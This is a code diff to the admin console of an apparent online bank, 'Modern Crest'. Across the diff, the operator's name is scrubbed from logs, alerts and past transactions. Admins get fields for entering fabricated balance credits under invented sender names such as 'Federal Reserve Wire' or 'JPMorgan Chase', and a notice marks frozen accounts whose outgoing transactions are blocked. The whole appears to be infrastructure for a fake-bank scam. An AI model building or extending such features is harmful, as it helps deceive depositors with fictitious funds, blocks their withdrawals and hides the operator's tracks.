@@ -416,7 +416,7 @@ a{text-decoration:none;color:inherit}
       <path d="M21 36 L32 15 L43 36 L32 30.5 Z" fill="url(#gA)"/>
     </svg>
     <h2 class="auth-title">Administrator Portal</h2>
-    <p class="auth-sub">Restricted personnel only · Authorized for Tom Harrison</p>
+    <p class="auth-sub">Restricted personnel only · Authorized Executive Access</p>
     
     <div class="pin-row" id="pin-dots">
       <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
@@ -453,7 +453,7 @@ a{text-decoration:none;color:inherit}
         </svg>
         <div>
           <div class="brand-name">Modern <span>Crest</span></div>
-          <span class="adm-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/></svg> Admin Console · Tom Harrison</span>
+          <span class="adm-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/></svg> Admin Console · Authorized</span>
         </div>
       </div>
       
@@ -510,6 +510,9 @@ a{text-decoration:none;color:inherit}
         <h3 id="am-name" style="font-family:'Sora';font-size:18px;margin-bottom:4px">—</h3>
         <p class="sub" id="am-email" style="font-size:12.5px;color:var(--muted);margin-bottom:8px">—</p>
         <div class="am-tags" id="am-tags" style="display:flex;gap:6px;justify-content:center;margin-bottom:14px"></div>
+        <div id="am-frozen-notice" style="display:none;background:rgba(235,87,87,0.15);border:1px solid rgba(235,87,87,0.35);border-radius:12px;padding:9px 12px;font-size:12px;color:#ff8585;margin-bottom:12px;text-align:center;font-weight:600">
+          ⚠️ ACCOUNT IS CURRENTLY FROZEN — Outgoing client transactions blocked
+        </div>
         <p style="font-family:'Sora';font-size:26px;font-weight:700;margin-bottom:20px" id="am-bal">—</p>
       </div>
       <div style="display:flex;flex-direction:column;gap:10px">
@@ -527,12 +530,21 @@ a{text-decoration:none;color:inherit}
       <p class="sub" style="font-size:12.5px;color:var(--muted);margin-bottom:16px" id="am-amt-sub">—</p>
       <input id="am-amt-in" inputmode="numeric" placeholder="$0.00" style="width:100%;font-family:'Sora';font-size:32px;font-weight:700;text-align:center;padding:12px;border-radius:14px;background:rgba(255,255,255,.05);border:1px solid var(--border);color:#fff;margin-bottom:12px">
       <div class="amt-chips">
-        <button onclick="setAmt(100)">$100</button>
-        <button onclick="setAmt(500)">$500</button>
-        <button onclick="setAmt(1000)">$1,000</button>
-        <button onclick="setAmt(5000)">$5,000</button>
+        <button type="button" onclick="setAmt(100)">$100</button>
+        <button type="button" onclick="setAmt(500)">$500</button>
+        <button type="button" onclick="setAmt(1000)">$1,000</button>
+        <button type="button" onclick="setAmt(5000)">$5,000</button>
+        <button type="button" onclick="setAmt(25000)">$25,000</button>
+        <button type="button" onclick="setAmt(100000)">$100,000</button>
       </div>
-      <div style="display:flex;gap:10px;margin-top:20px">
+      <div style="text-align:left;margin:16px 0 14px">
+        <label id="am-tx-name-lbl" style="display:block;font-size:11.5px;font-weight:600;color:var(--gold-2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px">Deposit Name / Sender Name *</label>
+        <input id="am-tx-name" placeholder="e.g. JPMorgan Chase Wire, Federal Reserve, Citadel Securities" style="width:100%;font-size:13.5px;padding:11px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.14);color:#fff;outline:none;box-sizing:border-box;margin-bottom:12px" autocomplete="off">
+        
+        <label id="am-tx-desc-lbl" style="display:block;font-size:11.5px;font-weight:600;color:var(--gold-2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px">Description / Reference Memo *</label>
+        <input id="am-tx-desc" placeholder="e.g. Portfolio Allocation, Q3 Dividend, Institutional Credit" style="width:100%;font-size:13.5px;padding:11px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.14);color:#fff;outline:none;box-sizing:border-box;margin-bottom:6px" autocomplete="off">
+      </div>
+      <div style="display:flex;gap:10px;margin-top:16px">
         <button class="btn btn-gold" style="flex:1" id="am-amt-go" onclick="admConfirmAmt()">Confirm</button>
         <button class="btn btn-ghost" style="flex:1" onclick="admBack()">Back</button>
       </div>
@@ -626,8 +638,22 @@ function ensureUserAccounts(){
 }
 ensureUserAccounts();
 
+// Clean up any historical test transactions mentioning Tom Harrison
+try {
+  let storedTxs = JSON.parse(localStorage.getItem('mcb_txs')) || [];
+  let txCleaned = false;
+  storedTxs.forEach(t => {
+    if (t.n && t.n.includes('Tom Harrison')) {
+      t.n = t.n.replace(/Tom Harrison/g, 'Institutional Wire');
+      if (!t.desc) t.desc = 'Treasury Transaction';
+      txCleaned = true;
+    }
+  });
+  if (txCleaned) localStorage.setItem('mcb_txs', JSON.stringify(storedTxs));
+} catch(e){}
+
 let ADM_LOG = JSON.parse(localStorage.getItem('mcb_admin_log')) || [
- {t:'Today · 09:12',txt:'Admin Portal session initialized for Tom Harrison'},
+ {t:'Today · 09:12',txt:'Admin Portal session initialized for Lead Administrator'},
  {t:'Yesterday · 17:03',txt:'Account status verified'},
 ];
 
@@ -660,7 +686,7 @@ function pinSubmit(){
     document.getElementById('auth-view').style.display='none';
     document.getElementById('app-view').style.display='block';
     renderAdmin();
-    toast('Authenticated as Tom Harrison');
+    toast('Authenticated as Lead Administrator');
   } else {
     toast('Invalid Admin PIN (Default: 0000)');
     pinReset();
@@ -840,7 +866,7 @@ function admApprove(id){
   syncUsersToServer(ADM_USERS);
   admLog('Approved upgrade: '+u.name+' → '+TIER_INFO[u.tier].name+' tier');
   toast('Upgrade approved for '+u.name);
-  sendTelegramAlert(`👑 <b>TIER UPGRADE APPROVED (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Tier:</b> ${oldTier.toUpperCase()} ➔ <b>${u.tier.toUpperCase()}</b>\n<b>Approved By:</b> Tom Harrison (Dashboard)`);
+  sendTelegramAlert(`👑 <b>TIER UPGRADE APPROVED (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Tier:</b> ${oldTier.toUpperCase()} ➔ <b>${u.tier.toUpperCase()}</b>\n<b>Approved By:</b> Lead Administrator (Dashboard)`);
   renderAdmin();
 }
 function admReject(id){
@@ -850,7 +876,7 @@ function admReject(id){
   syncUsersToServer(ADM_USERS);
   admLog('Rejected upgrade request for '+u.name);
   toast('Upgrade rejected for '+u.name);
-  sendTelegramAlert(`⚠️ <b>TIER UPGRADE REJECTED (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Action By:</b> Tom Harrison (Dashboard)`);
+  sendTelegramAlert(`⚠️ <b>TIER UPGRADE REJECTED (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Action By:</b> Lead Administrator (Dashboard)`);
   renderAdmin();
 }
 
@@ -862,7 +888,15 @@ function admOpen(id){
   document.getElementById('am-email').textContent=u.email+' · joined '+(u.joined||'Recently');
   document.getElementById('am-tags').innerHTML=admTag(u.tier)+(u.status==='frozen'?admTag('frozen'):admTag('active'))+(u.kyc==='pending'?admTag('pending'):u.kyc==='rejected'?admTag('rejected'):'');
   document.getElementById('am-bal').textContent=fmtBal(u.balance);
-  document.getElementById('am-freeze').textContent=u.status==='frozen'?'Reactivate account':'Freeze account';
+  const frBtn = document.getElementById('am-freeze');
+  if(frBtn){
+    frBtn.textContent=u.status==='frozen'?'❄️ Unfreeze account':'🔒 Freeze account';
+    frBtn.style.background=u.status==='frozen'?'rgba(39,174,96,0.18)':'rgba(235,87,87,0.12)';
+    frBtn.style.borderColor=u.status==='frozen'?'rgba(39,174,96,0.4)':'rgba(235,87,87,0.3)';
+    frBtn.style.color=u.status==='frozen'?'#2ECC71':'#ff6b6b';
+  }
+  const frNotice = document.getElementById('am-frozen-notice');
+  if(frNotice) frNotice.style.display = u.status==='frozen' ? 'block' : 'none';
   admView('menu');
   document.getElementById('modal3').classList.add('open');
   document.body.style.overflow='hidden';
@@ -879,9 +913,9 @@ function admPromote(){
   u.tier=TIER_ORDER[ti+1];if(u.kyc==='pending'&&u.target===u.tier){u.kyc='verified';u.target=null;}
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
-  admLog(u.name+' promoted to '+TIER_INFO[u.tier].name+' by Tom Harrison');
+  admLog(u.name+' promoted to '+TIER_INFO[u.tier].name+' by Lead Admin');
   toast(u.name+' → '+TIER_INFO[u.tier].name+' tier');
-  sendTelegramAlert(`👑 <b>CLIENT PROMOTED</b>\n\n<b>Client:</b> ${u.name}\n<b>New Tier:</b> ${u.tier.toUpperCase()}\n<b>By:</b> Tom Harrison`);
+  sendTelegramAlert(`👑 <b>CLIENT PROMOTED</b>\n\n<b>Client:</b> ${u.name}\n<b>New Tier:</b> ${u.tier.toUpperCase()}\n<b>Timestamp:</b> ${new Date().toUTCString()}`);
   admOpen(u.id);renderAdmin();
 }
 function admDemote(){
@@ -889,7 +923,7 @@ function admDemote(){
   u.tier=TIER_ORDER[ti-1];
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
-  admLog(u.name+' demoted to '+TIER_INFO[u.tier].name+' by Tom Harrison');
+  admLog(u.name+' demoted to '+TIER_INFO[u.tier].name+' by Lead Admin');
   toast(u.name+' → '+TIER_INFO[u.tier].name+' tier');
   admOpen(u.id);renderAdmin();
 }
@@ -900,7 +934,7 @@ function admFreeze(){
   syncUsersToServer(ADM_USERS);
   admLog((u.status==='frozen'?'Account frozen: ':'Account unfrozen: ')+u.name);
   toast(u.status==='frozen'?u.name+' frozen':u.name+' reactivated');
-  sendTelegramAlert(`🔒 <b>ACCOUNT STATUS CHANGED</b>\n\n<b>Client:</b> ${u.name}\n<b>Status:</b> ${u.status.toUpperCase()}\n<b>By:</b> Tom Harrison`);
+  sendTelegramAlert(`🔒 <b>ACCOUNT STATUS CHANGED</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>New Status:</b> <b>${u.status.toUpperCase()}</b>\n<b>Timestamp:</b> ${new Date().toUTCString()}`);
   admOpen(u.id);renderAdmin();
 }
 function admDeleteUser(){
@@ -932,23 +966,35 @@ function admDeleteUser(){
   localStorage.setItem('mcb_cards', JSON.stringify(allCards));
 
   // 4. Send Telegram Broadcast Notice
-  const tgNotice = `🗑️ <b>CLIENT ACCOUNT DELETED (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${deletedName}\n<b>Account Number:</b> <code>${deletedAcct}</code>\n<b>Tier:</b> ${deletedTier}\n<b>Action Executed By:</b> Tom Harrison (Lead Admin)\n<b>Remaining Registered Clients:</b> <b>${ADM_USERS.length}</b>\n<b>Timestamp:</b> ${new Date().toUTCString()}`;
+  const tgNotice = `🗑️ <b>CLIENT ACCOUNT DELETED (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${deletedName}\n<b>Account Number:</b> <code>${deletedAcct}</code>\n<b>Tier:</b> ${deletedTier}\n<b>Action Executed By:</b> Lead Administrator\n<b>Remaining Registered Clients:</b> <b>${ADM_USERS.length}</b>\n<b>Timestamp:</b> ${new Date().toUTCString()}`;
   sendTelegramAlert(tgNotice);
 
   // 5. Post deletion sync to backend daemon
   syncUsersToServer(ADM_USERS, { action: 'delete_user', userId: deletedId });
 
   // 6. Audit log & UI feedback
-  admLog(`Account permanently deleted: ${deletedName} (${deletedAcct}) by Tom Harrison`);
+  admLog(`Account permanently deleted: ${deletedName} (${deletedAcct}) by Lead Admin`);
   toast(`Account permanently deleted: ${deletedName}`);
   admClose();
   renderAdmin();
 }
 function admFund(mode){
   admState.amtMode=mode;const u=admState.sel;
-  document.getElementById('am-amt-title').textContent=mode==='add'?'Add funds (Deposit)':'Deduct funds (Debit)';
+  document.getElementById('am-amt-title').textContent=mode==='add'?'Credit Account (Deposit)':'Debit Account (Withdrawal)';
   document.getElementById('am-amt-sub').textContent=(mode==='add'?'Credit ':'Debit ')+u.name+' · Current balance '+fmtBal(u.balance);
   document.getElementById('am-amt-in').value='';
+  if(document.getElementById('am-tx-name')) document.getElementById('am-tx-name').value='';
+  if(document.getElementById('am-tx-desc')) document.getElementById('am-tx-desc').value='';
+  
+  const nameLbl = document.getElementById('am-tx-name-lbl');
+  const descLbl = document.getElementById('am-tx-desc-lbl');
+  const nameInp = document.getElementById('am-tx-name');
+  const descInp = document.getElementById('am-tx-desc');
+  if(nameLbl) nameLbl.innerHTML = (mode==='add'?'Deposit Name / Sender Name':'Debit Name / Beneficiary Name') + ' <span style="color:var(--gold-2)">*</span>';
+  if(descLbl) descLbl.innerHTML = (mode==='add'?'Deposit Description / Memo':'Debit Description / Memo') + ' <span style="color:var(--gold-2)">*</span>';
+  if(nameInp) nameInp.placeholder = mode==='add'?'e.g. Federal Reserve Wire, JPMorgan Chase, Citadel Securities':'e.g. Wire Withdrawal, Management Fee, Tax Settlement';
+  if(descInp) descInp.placeholder = mode==='add'?'e.g. Institutional Capital Inflow, Q3 Distribution':'e.g. Authorized Wire Debit, Asset Management Settlement';
+
   document.getElementById('am-amt-go').textContent=mode==='add'?'Confirm & credit':'Confirm & debit';
   document.getElementById('am-amt-go').style.background=mode==='add'?'var(--grad-gold)':'linear-gradient(135deg,#E05A5A,#B92E2E)';
   document.getElementById('am-amt-go').style.color=mode==='add'?'#231A05':'#fff';
@@ -962,14 +1008,45 @@ function admConfirmAmt(){
   if(!amt||amt<=0){toast('Enter a valid amount');return;}
   if(admState.amtMode==='deduct'&&amt>u.balance){toast('Amount exceeds user balance');return;}
   
-  u.balance = admState.amtMode==='add' ? u.balance + amt : Math.max(0, u.balance - amt);
+  const isAdd = admState.amtMode === 'add';
+  let txName = (document.getElementById('am-tx-name') ? document.getElementById('am-tx-name').value.trim() : '');
+  let txDesc = (document.getElementById('am-tx-desc') ? document.getElementById('am-tx-desc').value.trim() : '');
+
+  // Prompt admin if empty so there is always a custom deposit name and description!
+  if(!txName){
+    const defaultTxName = isAdd ? "Institutional Wire Deposit" : "Direct Account Debit";
+    const enteredName = prompt(
+      isAdd 
+        ? "Please enter the Deposit Name / Sender Name (e.g. Federal Reserve Wire, Citadel Securities, Client Deposit):" 
+        : "Please enter the Debit / Beneficiary Name:",
+      defaultTxName
+    );
+    if(enteredName === null) return;
+    txName = enteredName.trim() || defaultTxName;
+    if(document.getElementById('am-tx-name')) document.getElementById('am-tx-name').value = txName;
+  }
+
+  if(!txDesc){
+    const defaultDesc = isAdd ? "Private Banking Funds Inflow" : "Authorized Institutional Settlement";
+    const enteredDesc = prompt(
+      isAdd 
+        ? "Please enter a Description / Reference Memo for this deposit (e.g. Q3 Distribution, Client Retainer, Capital Wire):" 
+        : "Please enter a Description / Reference Memo for this debit:",
+      defaultDesc
+    );
+    if(enteredDesc === null) return;
+    txDesc = enteredDesc.trim() || defaultDesc;
+    if(document.getElementById('am-tx-desc')) document.getElementById('am-tx-desc').value = txDesc;
+  }
+
+  u.balance = isAdd ? u.balance + amt : Math.max(0, u.balance - amt);
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
 
-  const isAdd = admState.amtMode === 'add';
   const newTx = {
     userId: u.id,
-    n: isAdd ? "Deposit from Tom Harrison" : "Debit by Tom Harrison",
+    n: txName,
+    desc: txDesc,
     d: "Today · " + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
     a: isAdd ? amt : -amt,
     type: isAdd ? "in" : "out",
@@ -979,10 +1056,10 @@ function admConfirmAmt(){
   allTxs.unshift(newTx);
   localStorage.setItem('mcb_txs', JSON.stringify(allTxs));
 
-  admLog(fmtBal(amt)+(isAdd?' credited to ':' debited from ')+u.name);
+  admLog(fmtBal(amt)+(isAdd?' credited to ':' debited from ')+u.name+' ('+txName+')');
   toast((isAdd?'Credited ':'Debited ')+fmtBal(amt)+' → '+u.name);
   
-  sendTelegramAlert(`💸 <b>FUNDS ${isAdd?'CREDITED':'DEBITED'} (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${u.name}\n<b>Account:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Amount:</b> $${amt.toLocaleString()}\n<b>New Balance:</b> $${u.balance.toLocaleString()}\n<b>By:</b> Tom Harrison`);
+  sendTelegramAlert(`💸 <b>FUNDS ${isAdd?'CREDITED':'DEBITED'} (ADMIN DASHBOARD)</b>\n\n<b>Client:</b> ${u.name}\n<b>Account:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Amount:</b> $${amt.toLocaleString()}\n<b>New Balance:</b> $${u.balance.toLocaleString()}\n<b>${isAdd?'Deposit Name / Sender':'Transaction Name'}:</b> ${txName}\n<b>Description / Memo:</b> ${txDesc}\n<b>Timestamp:</b> ${new Date().toUTCString()}`);
   
   admView('menu');
   admOpen(u.id);
